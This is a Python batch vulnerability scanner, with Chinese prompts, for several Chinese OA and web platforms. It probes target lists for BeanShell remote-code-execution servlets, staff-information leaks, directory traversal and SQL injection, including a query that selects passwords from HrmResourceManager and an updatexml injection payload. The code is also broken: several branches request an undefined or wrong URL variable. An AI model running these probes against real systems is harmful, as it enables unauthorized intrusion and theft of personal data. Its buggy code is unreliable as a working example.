#!/usr/bin/python
#encoding:utf-8
import requests
print("OA系统批量漏洞检测")
print("***********************")
print("*      用友NC(1)       *")
print("*      微泛(2)         *")
print("*      宝塔(3)         *")
print("*      通达(4)         *")
print("*      新点(5)         *")
print("*      致翔(6)         *")
print("*     WeiPHP后台系统(7) *")
print("*     发货100 M_id(8)  *")
print("*      金蝶(9)         *")
print("***********************")
OA = input("请选择要检测的OA系统: ")
str(OA)
filename = input("输入文件名: ") #输入文件名
str(filename) #将文件名转化为str型
check_file = open(filename, "r", encoding='utf-8')  # 读取文件
for line in check_file.readlines():  # 用for循环按行显示
    line = line.strip()  # 将末尾的空行删除
    print('[+]%s' % line)  # 打印fil
print("确认是否加载正确")
if OA == "1":
    choose = input("[y/n]:")  #如果是则添加exp;如果不是退出
    str(choose)
    if choose == 'y':
        check_file = open(filename, "r", encoding='utf-8')
        for line in check_file.readlines():
            line = line.strip()
            # noinspection PyBroadException
            try:  # 测试
                vul_url = line + "/servlet/~ic/bsh.servlet.BshServlet"
                r = requests.get(vul_url, timeout=5, verify=False).status_code
                if r == 200:
                    print("[+]可能存在Beanshell_rce漏洞: " + vul_url)
                    # noinspection PyBroadException
                    try:
                        mysqlxl_vul_url = line + "/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
                        r1 = requests.get(mysqlxl_vul_url, timeout=5, verify=False).status_code
                        if r1 == 200:
                            print("[+]可能存在人员信息泄露:  "+ mysqlxl_vul_url)
                        else:
                            print("[-]不存在人员信息泄露: "+mysqlxl_vul_url)
                            pass
                    except:
                        print("ERROR:无法连接: "+mysqlxl_vul_url)
                else:
                    print("[-]不存在Beanshell_rce漏洞: " + vul_url)
                    # noinspection PyBroadException
                    try:
                        mysqlxl_vul_url = line + "/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
                        r1 = requests.get(mysqlxl_vul_url, timeout=5, verify=False).status_code
                        if r1 == 200:
                            print("[+]可能存在人员信息泄露:  "+ mysqlxl_vul_url)
                        else:
                            print("[-]不存在人员信息泄露: "+mysqlxl_vul_url)
                            pass
                    except:
                        print("ERROR:无法连接: "+mysqlxl_vul_url)
                    pass
            except:
                print("ERROR:无法连接:  " + vul_url)

if OA == "2":
    choose = input("[y/n]:")  # 如果是则添加exp;如果不是退出
    str(choose)
    if choose == 'y':
        print("正在探测微泛V8前台注入漏洞")
        check_file = open(filename, "r", encoding='utf-8')
        for line in check_file.readlines():
            line = line.strip()
            # noinspection PyBroadException
            try:  # 测试
                wf_vul_url = line + "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
                r = requests.get(wf_vul_url, timeout=5, verify=False).status_code
                if r == 200:

                    print("[+]可能存在微泛注入漏洞: " + wf_vul_url)
                    # noinspection PyBroadException
                    try:
                        wf_vul_rce_url = line + "/weaver/bsh.servlet.BshServlet"
                        r = requests.get(wf_vul_rce_url, timeout=5, verify=False).status_code
                        if r == 200:
                            print("[+]可能存在泛微E-cologyOA 远程代码执行漏洞:  " + wf_vul_url)
                        else:
                            print("[-]不存在泛微E-cologyOA 远程代码执行漏洞: " + wf_vul_url)
                    except:
                        print("ERROR:无法连接: " + wf_vul_url)

                else:
                    print("[-]不存在微泛注入漏洞: " + wf_vul_url)
                    # noinspection PyBroadException
                    try:
                        wf_vul_rce_url = line + "/weaver/bsh.servlet.BshServlet"
                        r = requests.get(wf_vul_rce_url, timeout=5, verify=False).status_code
                        if r == 200:
                            print("[+]可能存在泛微E-cologyOA 远程代码执行漏洞:  " + wf_vul_url)
                        else:
                            print("[-]不存在泛微E-cologyOA 远程代码执行漏洞: " + wf_vul_url)
                    except:
                        print("ERROR:无法连接: " + wf_vul_url)
            except:
                print("ERROR:无法连接:  " + wf_vul_url)
if OA == "3":
    choose = input("[y/n]:")  # 如果是则添加exp;如果不是退出
    str(choose)
    if choose == 'y':
        check_file = open(filename, "r", encoding='utf-8')
        for line in check_file.readlines():
            line = line.strip()
            # noinspection PyBroadException
            try:
                bt_vul_url = line + "/pma"
                r = requests.get(bt_vul_url, timeout=5, verify=False).status_code
                if r == 200:
                    print("[+]可能存在宝塔未授权访问漏洞: "+bt_vul_url)
                else:
                    print("[-]不存在宝塔未授权访问漏洞: "+bt_vul_url)
                    pass
            except:
                print("ERROR:连接错误: "+bt_vul_url)
if OA == "4":
    choose = input("[y/n]:")  # 如果是则添加exp;如果不是退出
    str(choose)
    if choose == 'y':
        check_file = open(filename, "r", encoding='utf-8')
        for line in check_file.readlines():
            line = line.strip()
            # noinspection PyBroadException
            try:
                td_vul_url = line + "/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3"
                r = requests.get(td_vul_url, timeout=5, verify=False).status_code
                if r == 200:
                    print("[+]可能存在通达OA泄露漏洞:"+ td_vul_url)
                else:
                    print("[-]不存在通达OA泄露漏洞"+td_vul_url)
                    pass
            except:
                print("ERR:无法连接: "+td_vul_url)

if OA == "5":
    choose = input("[y/n]:")  # 如果是则添加exp;如果不是退出
    str(choose)
    if choose == 'y':
        check_file = open(filename, "r", encoding='utf-8')
        for line in check_file.readlines():
            line = line.strip()
            # noinspection PyBroadException
            try:
                xd_vul_url = line + "/ExcelExport/人员列表.xls"
                r = requests.get(xd_vul_url, timeout=5, verify=False).status_code
                if r == 200:
                    print("[+]可能存在新点OA人员信息泄露漏洞:" + xd_vul_url)
                else:
                    print("[-]不存在新点OA人员信息泄露漏洞" + xd_vul_url)
                    pass
            except:
                print("ERR:无法连接: " + xd_vul_url)
if OA == "6":
    choose = input("[y/n]:")  # 如果是则添加exp;如果不是退出
    str(choose)
    if choose == 'y':
        check_file = open(filename, "r", encoding='utf-8')
        for line in check_file.readlines():
            line = line.strip()
            # noinspection PyBroadException
            try:
                zx_vul_url = line + "/mainpage/msglog.aspx?user=1"
                r = requests.get(xd_vul_url, timeout=5, verify=False).status_code
                if r == 200:
                    print("[+]可能存在致翔OA的SQL注入漏洞:" + zx_vul_url)
                else:
                    print("[-]不存在致翔OA的SQL注入漏洞" + zx_vul_url)
                    pass
            except:
                print("ERR:无法连接: " + zx_vul_url)
if OA == "7":
    choose = input("[y/n]:")  # 如果是则添加exp;如果不是退出
    str(choose)
    if choose == 'y':
        check_file = open(filename, "r", encoding='utf-8')
        for line in check_file.readlines():
            line = line.strip()
            # noinspection PyBroadException
            try:
                WeiPHP_vul_url = line + "/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5(%271%27),0x7e),1)--+"
                r = requests.get(xd_vul_url, timeout=20, verify=False).status_code
                if r == 200:
                    print("[+]可能存在WeiPHP的SQL注入漏洞:" + WeiPHP_vul_url)
                else:
                    print("[-]不存在WeiPHP的SQL注入漏洞" + WeiPHP_vul_url)
                    pass
            except:
                print("ERR:无法连接: " + WeiPHP_vul_url)
if OA == "8":
    choose = input("[y/n]:")  # 如果是则添加exp;如果不是退出
    str(choose)
    if choose == 'y':
        check_file = open(filename, "r", encoding='utf-8')
        for line in check_file.readlines():
            line = line.strip()
            # noinspection PyBroadException
            try:
                MID_vul_url = line + "/?M_id=1%27&type=product"
                r = requests.get(xd_vul_url, timeout=20, verify=False).status_code
                if r == 200:
                    print("[+]可能存在发货100的SQL注入漏洞:" + MIDPHP_vul_url)
                else:
                    print("[-]不存在发货100的SQL注入漏洞" + MID_vul_url)
                    pass
            except:
                print("ERR:无法连接: " + MID_vul_url)
if OA == "9":
    choose = input("[y/n]:")  # 如果是则添加exp;如果不是退出
    str(choose)
    if choose == 'y':
        check_file = open(filename, "r", encoding='utf-8')
        for line in check_file.readlines():
            line = line.strip()
            # noinspection PyBroadException
            try:
                JD_vul_url = line + "/admin/protected/selector/server_file/files?folder=/"
                r = requests.get(xd_vul_url, timeout=20, verify=False).status_code
                if r == 200:
                    print("[+]可能存在金蝶OA的目录遍历漏洞:" + JD_vul_url)
                else:
                    print("[-]不存在金蝶OA的目录遍历漏洞" + JD_vul_url)
                    pass
            except:
                print("ERR:无法连接: " + JD_vul_url)